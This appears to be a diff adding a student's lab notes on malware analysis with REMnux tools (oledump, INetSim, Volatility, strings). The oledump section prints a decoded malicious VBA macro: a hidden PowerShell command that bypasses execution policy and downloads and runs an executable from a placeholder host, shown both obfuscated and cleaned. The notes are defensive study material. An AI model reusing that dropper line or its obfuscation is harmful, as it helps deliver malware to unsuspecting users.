@@ -1,0 +1,100 @@
+# hey ChatGPT can you "mimic malware behavior" and hack my school pls?
+
+REMnux VM
+ - specialized linux distro
+ - includes many tools for reverse engineering, malware analysis, and forensics
+ - eg. Volatility, YARA, Wireshark, oledump, INetSim...
+
+__________________________________________
+File Analysis
+
+oleddump.py
+ - analyzes OLE2 files (Object Linking and Embedding)
+ - OLE2 (aka Compound File Binary Format) was developed by Microsoft
+ - OLE2 is used to store documents, spreadsheets and presentations
+
+ - oledump.py <filename> = analyze the file
+ - it will show a list of data streams in the file
+ - These streams have letters in front of them, as follows:
+    - A = ASCII text
+    - B = binary data
+    - M = macro (VBA)
+    - S = stream is compressed
+    - X = stream is encrypted
+    
+ - if you had to remember one letter, remember M (macro)
+ - to view the n-th stream, use: oledump.py <filename> -s n
+ - usually we would also like to decompress the VBA
+    - oledump.py <filename> -s n -vbadecompress
+
+Practical oledump.py task
+ -> oledump.py <filename> -s n -vbadecompress
+ -> After VBA decompressing, we found:
+ -> Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://SOME_IP/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
+ -> We used cyberchef to decode this, as follows
+    - we used 2 find/replaces in simple string mode
+    - we replaced with a blank value (put nothing there)
+    - 1) find/replace: find: * replace: 
+    - 2) find/replace: find: ^ replace: 
+
+ -> now we will try to understand what this command does
+ -> Sqtnew = "powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://SOME_IP/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
+  -> brief explanation of the command:
+    -WindowStyle hidden = powershell window won't be visible to the user
+    -executionpolicy bypass = allows powershell to run scripts without restrictions 
+    Invoke-WebRequest = downloads the executable from the specified URL
+    -OutFile $TempFile= saves the downloaded executable to $TempFile
+    Start-Process $TempFile = executes the downloaded executable
+
+ - pretty bad, right?
+
+__________________________________________
+Fake Network to aid analysis
+ 
+INetSim
+ = Internet Services Simulation Suite
+ - simulates a network so we can test potential malware
+ - esppecially useful for testing malwares' network activities
+
+Basic Workflow:
+ - we assume inetsim conf is in /etc/inetsim/inetsim.conf
+ - find your IP address with ifconfig
+ - sudo nano /etc/inetsim/inetsim.conf
+ - look for #dns_default_ip 0.0.0.0.
+ - change the line: #dns_default_ip 0.0.0.0
+ - change it to: dns_default_ip YOUR_IP_ADDRESS (we removed the "#" aswell)
+ - Ctrl+O, Enter, Ctrl+X to save and exit
+ - confirm your changes with cat /etc/inetsim/inetsim.conf | grep dns_default_ip
+
+ - sudo inetsim (starts the tool)
+ - make sure you see "Simulation running." at the bottom
+
+ - now we can access it from browser: https://YOUR_IP_ADDRESS
+ - we can try to mimic a malware downloading another binary/script
+   # in the lab we wget'ed a zip, there were some fake files
+   with sudo wget https://YOUR_IP_ADDRESS/SOME_FAKE_FILE --no-check-certificate
+   # we tested some .ps1 file, that when executed directed us to the inetsim homepage
+
+__________________________________________
+Preprocessing With Volatility and strings
+
+preprocessing = preparing data for analysis (usually save it to txt or json)
+
+sudo su
+vol3 -f <filename> <plugin>
+eg. vol3 -f wcry.mem windows.pstree.PsTree
+
+some basic windows plugins:
+ - windows.pstree.PsTree = shows the process tree
+ - windows.pslist.PsList = list active processes
+ - windows.cmdline.CmdLine = list process command line args
+ - windows.filescan.FileScan = scan for files in memory
+ - windows.dlllist.DllList = list loaded modules in a particular Windows memory image
+ - windows.malfind.Malfind = processes suspected of having an injected code
+ - windows.psscan.PsScan = scan for processes in memory
+
+We ran a very long command that used multiple plugins and saved results to txt files
+Now we need Linux strings to extract ASCII, 16-bit little-endian and 16-bit big-endian strings
+eg. strings wcry.mem > wcry.strings.ascii.txt
+    strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
+    strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
